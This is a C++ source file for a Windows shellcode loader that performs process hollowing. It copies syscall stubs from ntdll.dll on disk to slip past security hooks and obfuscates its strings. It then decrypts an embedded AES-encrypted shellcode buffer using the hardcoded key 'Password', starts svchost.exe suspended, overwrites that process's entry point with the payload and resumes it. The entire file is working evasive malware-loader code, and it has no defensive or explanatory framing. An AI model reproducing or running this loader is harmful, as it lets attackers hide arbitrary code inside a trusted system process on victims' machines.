#include <Windows.h>
#include <iostream>
#include <string>
#include <sstream>
#include <tlhelp32.h>
#include "structures.h"
#include "structs.h"
#include "obfuscate.h"

#define STATUS_SUCCESS 0

using namespace std;

int const SYSCALL_STUB_SIZE = 21;

MyNtOpenProcess _NtOpenProcess = NULL;
char OpenProcStub[SYSCALL_STUB_SIZE] = {};

MyNtAllocateVirtualMemory _NtAllocateVirtualMemory = NULL;
char AllocStub[SYSCALL_STUB_SIZE] = {};

MyNtWriteVirtualMemory _NtWriteVirtualMemory = NULL;
char WVMStub[SYSCALL_STUB_SIZE] = {};

MyNtReadVirtualMemory _NtReadVirtualMemory = NULL;
char RVMStub[SYSCALL_STUB_SIZE] = {};

MyNtProtectVirtualMemory _NtProtectVirtualMemory = NULL;
char ProtectStub[SYSCALL_STUB_SIZE] = {};

MyNtCreateThreadEx _NtCreateThreadEx = NULL;
char CreateThreadExStub[SYSCALL_STUB_SIZE];

MyNtResumeThread _NtResumeThread = NULL;
char ResumeThreadStub[SYSCALL_STUB_SIZE];

PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
	return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

BOOL MapSyscall(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
{
	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);

	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
	{
		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
		if (strcmp(functionNameResolved, functionName) == 0)
		{
			memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
			return TRUE;
		}
	}

	return FALSE;
}

BOOL FindOpenProc(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtOpenProcess = (MyNtOpenProcess)(LPVOID)OpenProcStub;
	BOOL status = VirtualProtect(OpenProcStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
	if (MapSyscall(AY_OBFUSCATE("NtOpenProcess"), exportDirectory, fileData, textSection, rdataSection, OpenProcStub))
	{
		return TRUE;
	}
	return FALSE;
}

HANDLE CallOpenProc(DWORD pid)
{
	// variables for NtOpenProcess
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES zoa;
	InitializeObjectAttributes(&zoa, NULL, NULL, NULL, NULL, NULL);
	CLIENT_ID targetPid = { 0 };
	targetPid.UniqueProcess = (void*)pid;
	NTSTATUS success = NULL;
	success = _NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &zoa, &targetPid);
	if (success != 0)
		return NULL;

	return hProcess;
}

BOOL FindAlloc(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtAllocateVirtualMemory = (MyNtAllocateVirtualMemory)(LPVOID)AllocStub;
	VirtualProtect(AllocStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtAllocateVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, AllocStub))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL FindWriteVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtWriteVirtualMemory = (MyNtWriteVirtualMemory)(LPVOID)WVMStub;
	VirtualProtect(WVMStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtWriteVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, WVMStub))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL FindReadVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtReadVirtualMemory = (MyNtReadVirtualMemory)(LPVOID)RVMStub;
	VirtualProtect(WVMStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtReadVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, RVMStub))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL FindProtectVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{

	DWORD oldProtection;
	_NtProtectVirtualMemory = (MyNtProtectVirtualMemory)(LPVOID)ProtectStub;
	VirtualProtect(ProtectStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtProtectVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, ProtectStub))
	{
		return TRUE;
	}
	return FALSE;
}

BOOL FindCreateThreadEx(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtCreateThreadEx = (MyNtCreateThreadEx)(LPVOID)CreateThreadExStub;
	VirtualProtect(CreateThreadExStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtCreateThreadEx"), exportDirectory, fileData, textSection, rdataSection, CreateThreadExStub))
	{
		return TRUE;
	}

	return FALSE;
}

BOOL FindResumeThread(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
{
	DWORD oldProtection;
	_NtResumeThread = (MyNtResumeThread)(LPVOID)ResumeThread;
	VirtualProtect(ResumeThreadStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

	if (MapSyscall(AY_OBFUSCATE("NtResumeThread"), exportDirectory, fileData, textSection, rdataSection, ResumeThreadStub))
	{
		return TRUE;
	}

	return FALSE;
}

BOOL EstablishSyscalls()
{
	LPVOID fileData = NULL;
	HANDLE file = NULL;
	DWORD fileSize = NULL;
	DWORD bytesRead = NULL;
	BOOL success = TRUE;

	file = CreateFileA(AY_OBFUSCATE("c:\\windows\\system32\\ntdll.dll"), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	fileSize = GetFileSize(file, NULL);
	fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
	if (!ReadFile(file, fileData, fileSize, &bytesRead, NULL))
		return FALSE;

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
	PIMAGE_SECTION_HEADER textSection = section;
	PIMAGE_SECTION_HEADER rdataSection = section;

	for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		if (strcmp((CHAR*)section->Name, (CHAR*)AY_OBFUSCATE(".rdata")) == 0) {
			rdataSection = section;
			break;
		}
		section++;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

	// Assign Syscall values
	if (!FindOpenProc(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindAlloc(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindWriteVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindReadVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindProtectVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindCreateThreadEx(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;
	if (!FindResumeThread(exportDirectory, fileData, textSection, rdataSection))
		success = FALSE;

	if (file)
	{
		CloseHandle(file);
		file = NULL;
	}

	if (success)
		return TRUE;

	return FALSE;

}

DWORD GetPIDByName(const std::wstring& processName) {
	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	if (Process32FirstW(hSnapshot, &pe32)) {
		do {
			if (std::wstring(pe32.szExeFile) == processName) {
				CloseHandle(hSnapshot);
				return pe32.th32ProcessID;
			}
		} while (Process32NextW(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return 0;
}


LPSTR lpSourceImage;
LPSTR lpTargetProcess;

// Structure to store the address process infromation.
struct ProcessAddressInformation
{
	LPVOID lpProcessPEBAddress;
	LPVOID lpProcessImageBaseAddress;
};

//Structure relocation entry based on : https://docs.microsoft.com/fr-fr/windows/win32/debug/pe-format#the-reloc-section-image-only
typedef struct IMAGE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, * PIMAGE_RELOCATION_ENTRY;


/**
 * Function to retrieve the PEB address and image base address of the target process x64.
 * \param lpPI : pointer to the process infromation.
 * \return : if it is failed both address are nullptr.
 */
ProcessAddressInformation GetProcessAddressInformation64(const PPROCESS_INFORMATION lpPI)
{
	PVOID lpImageBaseAddress = nullptr;
	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;
	GetThreadContext(lpPI->hThread, &CTX);
	NTSTATUS status = _NtReadVirtualMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageBaseAddress, sizeof(UINT64), nullptr);
	//const BOOL bReadBaseAddress = ReadProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageBaseAddress, sizeof(UINT64), nullptr);

	if (status != STATUS_SUCCESS)
		return ProcessAddressInformation{ nullptr, nullptr };

	return ProcessAddressInformation{ (LPVOID)CTX.Rdx, lpImageBaseAddress };
}


/**
 * Function to write the new PE image and resume the process thread x64.
 * \param lpPI : pointer to the process informations structure.
 * \param buf : shellcode.
 * \return : TRUE if the PE run succesfully else FALSE.
 */
BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const ProcessAddressInformation ProcessAddressInformation, unsigned char* buf, SIZE_T szAllocation)
{
	LPVOID lpAllocAddress;
	DWORD64 addrBuf;
	byte data[0x200];
	SIZE_T nRead;
	DWORD oldProtect;
	NTSTATUS status = STATUS_SUCCESS;

	LPVOID ptrToImageBase = (LPVOID)((uintptr_t)(ProcessAddressInformation.lpProcessPEBAddress) + 0x10);
	_NtReadVirtualMemory(lpPI->hProcess, ptrToImageBase, &addrBuf, sizeof(addrBuf), nullptr);

	LPVOID svchostBase = (LPVOID)(uint64_t)addrBuf;
	_NtReadVirtualMemory(lpPI->hProcess, svchostBase, &data, sizeof(data), nullptr);

	int e_lfanew_offset = *(data + 0x3C);
	int opthdr = e_lfanew_offset + 0x28;

	uint32_t entrypoint_rva = *((uint32_t*)(data + opthdr));
	LPVOID addressOfEntryPoint = (LPVOID)(entrypoint_rva + (uint64_t)svchostBase);

	LPVOID _addressOfEntryPoint = addressOfEntryPoint;
	SIZE_T _szAllocation = szAllocation;

	status = _NtProtectVirtualMemory(lpPI->hProcess, &_addressOfEntryPoint, &_szAllocation, PAGE_EXECUTE_READWRITE, &oldProtect);
	if (status != STATUS_SUCCESS)
	{
		return FALSE;
	}
	status = _NtWriteVirtualMemory(lpPI->hProcess, addressOfEntryPoint, (PVOID)buf, szAllocation, NULL);
	if (status != STATUS_SUCCESS)
	{
		return FALSE;
	}
	status = _NtProtectVirtualMemory(lpPI->hProcess, &addressOfEntryPoint, &szAllocation, oldProtect, &oldProtect);
	if (status != STATUS_SUCCESS)
	{
		return FALSE;
	}

	_NtResumeThread(lpPI->hThread, NULL);

	return TRUE;
}


int main(const int argc, char* argv[])
{

	const LPSTR lpTargetProcess = (LPSTR)AY_OBFUSCATE("C:\\Windows\\System32\\svchost.exe");
	string key_s = (string)AY_OBFUSCATE("Password");
	unsigned char buf[] =
		"\xd4\xec\x0a\x8f\x6c\x95\xb5\x70\x16\x34\x59\xdd\x8a\xc9"
		"\x47\xf7\x29\x12\x9e\x90\xd7\x82\x2d\x2f\x9c\x06\x01\x82"
		"\x3f\x4d\x75\x69\xb3\x91\xfb\x21\x40\x8f\x60\x54\xcd\x33"
		"\xa4\x58\x88\x7b\xa8\xe1\x10\xee\x84\x5e\x06\x4f\x74\xb6"
		"\xb2\xd8\x2a\x78\x21\x74\x1c\xad\x69\xd9\xc3\xea\x99\xf6"
		"\x66\x83\xba\x6e\xae\x4b\x97\xdc\xce\x11\x39\x27\x4c\xbe"
		"\x0c\xcd\xa9\x0a\x34\x57\x3d\x98\xc4\xcb\xdd\x18\x84\x30"
		"\xfe\xf6\x89\xd4\x25\x15\x57\x40\xb8\x3a\xcd\x9e\xac\xe2"
		"\x54\x4f\x57\x61\xe6\x2e\x0e\x1f\x22\x20\xdf\xa1\xf6\x9a"
		"\xb6\x7a\xad\xfd\x1c\x34\xa7\xcd\x37\x98\x96\xe8\xd9\x80"
		"\x97\x19\x17\x8f\xc7\xf4\x30\x38\x7c\x2c\x36\xee\x42\x6f"
		"\x7c\x00\x35\x7b\x92\x54\xfb\xc7\x85\x38\x0a\x79\x8c\xcd"
		"\x11\x64\x5a\xae\xeb\x8c\x0b\x9b\xb0\x6f\x6e\xbe\x66\x0b"
		"\x33\x82\xcf\x66\x7a\x29\x8a\x96\xa6\x6d\x53\xeb\x8d\x02"
		"\x19\x89\xc7\xc0\x33\x4d\x0c\x5d\x13\x30\x76\x60\x07\x26"
		"\xd6\xc9\x4f\x06\x0f\x66\x64\x45\x5d\xd3\xaf\xcc\x44\x4c"
		"\x61\x01\xc5\x80\xd6\x81\xa1\x58\x84\x8e\x53\x21\x7f\xae"
		"\x40\x8b\xfd\xa1\xb0\x98\xd3\x9b\x74\x15\x9b\xa8\xaa\xc2"
		"\x72\x09\xd3\xc4\x3a\x8a\x29\xfc\x49\xaa\x08\x0d\x1c\xab"
		"\x7b\x79\x95\xa1\x71\xd2\x05\x7a\x24\xce\x5b\x00\xe1\x34"
		"\x80\x3d\xd9\x56\x02\x1f\xab\x9f";

	SIZE_T szAllocation = sizeof buf;

	while (key_s.length() < 16) {
		key_s += "0";
	}
	const char* cstr = key_s.c_str();
	istringstream iss(cstr);
	unsigned char key[17];
	iss >> key;
	unsigned char expandedKey[176];
	KeyExpansion(key, expandedKey);
	int messageLen = sizeof buf - 1;
	unsigned char* shellcode = new unsigned char[messageLen];
	for (int i = 0; i < messageLen; i += 16) {
		AESDecrypt(buf + i, expandedKey, shellcode + i);
	}

	if (!EstablishSyscalls())
		return 1;

	printf(AY_OBFUSCATE("[PROCESS HOLLOWING]\n"));
	STARTUPINFOA SI;
	PROCESS_INFORMATION PI;

	ZeroMemory(&SI, sizeof(SI));
	SI.cb = sizeof(SI);
	ZeroMemory(&PI, sizeof(PI));

	const BOOL bProcessCreation = CreateProcessA(lpTargetProcess, nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &SI, &PI);
	if (!bProcessCreation)
	{
		printf(AY_OBFUSCATE("[-] An error is occured when trying to create the target process !\n"));
		return -1;
	}

	ProcessAddressInformation ProcessAddressInformation = { nullptr, nullptr };

	ProcessAddressInformation = GetProcessAddressInformation64(&PI);
	if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
	{
		printf(AY_OBFUSCATE("[-] An error is occured when trying to get the image base address of the target process !\n"));
		return -1;
	}

	printf(AY_OBFUSCATE("[+] Target Process PEB : 0x%p\n"), ProcessAddressInformation.lpProcessPEBAddress);
	printf(AY_OBFUSCATE("[+] Target Process Image Base : 0x%p\n"), ProcessAddressInformation.lpProcessImageBaseAddress);

	if (RunPE64(&PI, ProcessAddressInformation, shellcode, szAllocation))
	{
		printf(AY_OBFUSCATE("[+] The injection has succeed !\n"));
		return 0;
	}

	printf(AY_OBFUSCATE("[-] The injection has failed !\n"));

	if (PI.hThread != nullptr)
		CloseHandle(PI.hThread);

	if (PI.hProcess != nullptr)
	{
		TerminateProcess(PI.hProcess, -1);
		CloseHandle(PI.hProcess);
	}

	return -1;
}